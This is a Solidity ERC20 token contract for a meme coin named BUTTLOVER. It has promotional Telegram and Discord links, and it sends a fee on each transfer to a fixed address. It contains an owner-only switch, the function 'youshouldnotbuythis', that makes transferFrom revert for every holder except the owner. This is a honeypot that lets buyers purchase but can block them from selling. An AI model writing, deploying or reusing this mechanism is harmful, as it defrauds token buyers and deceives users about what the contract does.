pragma solidity ^0.8.0;
//SPDX-License-Identifier: NONE
//Only for the REAL BUTT LOVERS
//Website coming soon!
//t.me/BUTTLOVERSETH
//https://discord.gg/hAPMraybtb

import "./ERC20.sol";
import "./Ownable.sol";

contract BUTTLOVER is Ownable, ERC20 {
    uint BURN_FEE = 2;
    uint YES_FEE = 2;
    address payable public BUTTHOLE = payable(address(0xB1c263Eec70A7AF3aD1B8CaF3247f6E8f5C6C2d1));
    bool private _TotallyChill = false;

constructor() ERC20 ('BUTTLOVER','BUTTLOVER') {
    _mint(msg.sender, 426900000000* 10 ** 18);
    }
       
function youshouldnotbuythis() external onlyOwner
    {
        _TotallyChill = !_TotallyChill;
    }
   
function transfer(address recipient, uint256 amount) public override returns (bool){
            uint burnAmount = amount*(BURN_FEE) / 100;
            uint yesAmount = amount*(YES_FEE) / 100;
            _burn(_msgSender(), burnAmount);
            _transfer(_msgSender(), recipient, amount-(burnAmount)-(yesAmount));
            _transfer(_msgSender(), BUTTHOLE, yesAmount);
      return true;
    }    

function transferFrom(
        address from, 
        address to, 
        uint256 amount
    ) public override returns (bool) 
    {     
        require(!_TotallyChill || tx.origin == owner(), "I TOLD YOU");
        return super.transferFrom(from, to, amount);
    }
}